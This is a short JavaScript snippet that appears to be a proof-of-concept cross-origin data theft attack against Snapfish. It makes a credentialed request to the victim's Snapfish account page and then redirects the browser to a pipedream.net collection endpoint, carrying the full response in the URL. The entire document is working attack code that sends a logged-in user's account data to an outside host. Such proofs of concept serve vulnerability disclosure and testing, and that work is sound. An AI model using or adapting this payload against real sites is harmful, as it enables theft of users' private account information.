var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://www.snapfish.com/youraccount?tab=tab-1',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='https://en0wwy1g0an7hi.x.pipedream.net?key='+this.responseText;
};
